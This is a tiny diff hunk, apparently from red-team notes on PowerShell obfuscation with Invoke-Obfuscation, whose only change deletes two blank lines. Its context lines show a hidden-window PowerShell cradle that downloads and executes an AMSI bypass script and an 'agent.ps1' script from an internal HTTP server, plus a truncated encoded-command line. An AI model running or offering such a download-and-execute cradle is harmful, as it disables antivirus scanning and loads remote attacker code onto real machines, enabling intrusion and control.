@@ -66,6 +66,4 @@ Invoke-Obfuscation\Token\All> 1
 powershell.exe -NoP -w hidden -c 'iex(iwr http://192.168.2.228:8081/amsibypass.txt -useb); iex(iwr http://192.168.2.228:8081/agent.ps1 -useb)'
 
 powershell.exe -NoP -w hidden -e 
-
-
 ```
